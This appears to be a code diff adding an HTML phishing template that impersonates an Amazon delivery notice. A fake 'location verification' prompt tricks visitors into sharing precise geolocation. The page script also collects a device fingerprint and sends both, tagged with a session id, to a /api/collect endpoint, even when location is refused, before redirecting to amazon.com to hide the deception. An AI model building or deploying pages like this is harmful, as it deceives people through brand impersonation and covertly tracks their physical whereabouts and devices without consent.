@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Amazon Ember', Arial, sans-serif;
+            background: #f3f3f3;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 40px 30px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #ddd;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #232f3e;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .logo::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: #ff9900;
+            border-radius: 2px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #0f1111;
+        }
+        
+        .subtitle {
+            color: #565959;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+        
+        .delivery-box {
+            background: #f7f8f8;
+            border-radius: 8px;
+            padding: 25px 20px;
+            margin-bottom: 25px;
+            border: 1px solid #d5d9d9;
+        }
+        
+        .delivery-header {
+            font-size: 18px;
+            font-weight: 600;
+            color: #0f1111;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .package-info {
+            background: white;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #d5d9d9;
+            text-align: left;
+        }
+        
+        .package-title {
+            font-weight: 600;
+            color: #0f1111;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .package-detail {
+            color: #565959;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+        
+        .delivery-status {
+            display: inline-block;
+            background: #ff9900;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 8px;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #0f1111;
+            text-align: left;
+        }
+        
+        .feature-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            font-size: 18px;
+            color: #ff9900;
+        }
+        
+        .btn {
+            background: #ff9900;
+            color: #0f1111;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background 0.2s;
+        }
+        
+        .btn:hover {
+            background: #fa8900;
+        }
+        
+        .btn:disabled {
+            background: #d5d9d9;
+            color: #565959;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #565959;
+            font-style: italic;
+        }
+        
+        .error {
+            color: #c7511f;
+            margin-top: 15px;
+            display: none;
+            background: #fcf2f2;
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid #d5dbdb;
+        }
+        
+        .prime-badge {
+            display: inline-block;
+            background: #00a8cc;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .security-note {
+            margin-top: 25px;
+            padding: 15px;
+            background: #e6f7ff;
+            border-radius: 4px;
+            border: 1px solid #b8daff;
+        }
+        
+        .security-note h4 {
+            color: #0066cc;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .security-note p {
+            color: #0f1111;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+        
+        .estimated-time {
+            background: #d5f4e6;
+            color: #0f5132;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 10px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">amazon</div>
+        
+        <h1 class="title">Delivery Update</h1>
+        <p class="subtitle">Your package requires location confirmation for delivery</p>
+        
+        <div class="prime-badge">Prime Member</div>
+        
+        <div class="delivery-box">
+            <div class="delivery-header">
+                <span>📦</span>
+                <span>Package En Route</span>
+            </div>
+            
+            <div class="package-info">
+                <div class="package-title">📱 Electronics Package</div>
+                <div class="package-detail">Order #: 123-4567890-1234567</div>
+                <div class="package-detail">Carrier: Amazon Logistics</div>
+                <div class="package-detail">Weight: 2.3 lbs</div>
+                <div class="delivery-status">Out for Delivery</div>
+                <div class="estimated-time">⏰ Estimated: Today by 9 PM</div>
+            </div>
+            
+            <div class="feature-item">
+                <span class="feature-icon">📍</span>
+                <span>Precise delivery location needed</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🚚</span>
+                <span>Real-time delivery tracking</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">📱</span>
+                <span>SMS delivery notifications</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🔒</span>
+                <span>Secure package handoff</span>
+            </div>
+        </div>
+        
+        <button class="btn" id="enableLocation">
+            📍 Confirm Delivery Location
+        </button>
+        
+        <div class="loading" id="loading">
+            <i>🔄 Updating delivery information...</i>
+        </div>
+        
+        <div class="error" id="error"></div>
+        
+        <div class="security-note">
+            <h4>🛡️ Delivery Location Verification</h4>
+            <p>
+                To ensure secure delivery, Amazon requires location verification for high-value packages. This helps our delivery partners find the exact delivery address and provides you with accurate delivery updates and estimated arrival times.
+            </p>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/fingerprint.js') }}"></script>
+    <script>
+        const sessionId = '{{ session_id }}';
+        
+        document.getElementById('enableLocation').addEventListener('click', function() {
+            this.disabled = true;
+            this.textContent = '🔄 Verifying Location...';
+            document.getElementById('loading').style.display = 'block';
+            
+            const deviceData = collectDeviceFingerprint();
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        
+                        sendData({
+                            session_id: sessionId,
+                            location: locationData,
+                            device: deviceData,
+                            template: 'amazon'
+                        });
+                        
+                        document.getElementById('loading').innerHTML = '<i style="color: #067d62;">✅ Location confirmed! Your package will be delivered soon.</i>';
+                        setTimeout(() => {
+                            window.location.href = 'https://amazon.com';
+                        }, 2000);
+                    },
+                    function(error) {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('error').style.display = 'block';
+                        
+                        let errorMessage = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Location verification is required for secure package delivery. Please enable location services.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Unable to verify delivery location. Please try again.';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'Location verification timed out. Please try again.';
+                                break;
+                            default:
+                                errorMessage = 'Delivery location verification failed. Please try again.';
+                                break;
+                        }
+                        document.getElementById('error').textContent = errorMessage;
+                        
+                        sendData({
+                            session_id: sessionId,
+                            device: deviceData,
+                            template: 'amazon',
+                            location_error: errorMessage
+                        });
+                        
+                        const btn = document.getElementById('enableLocation');
+                        btn.disabled = false;
+                        btn.textContent = '📍 Try Again';
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').textContent = 'Location verification is not supported by this browser.';
+                
+                sendData({
+                    session_id: sessionId,
+                    device: deviceData,
+                    template: 'amazon',
+                    location_error: 'Geolocation not supported'
+                });
+            }
+        });
+        
+        function sendData(data) {
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(error => {
+                console.error('Error sending data:', error);
+            });
+        }
+    </script>
+</body>
+</html>
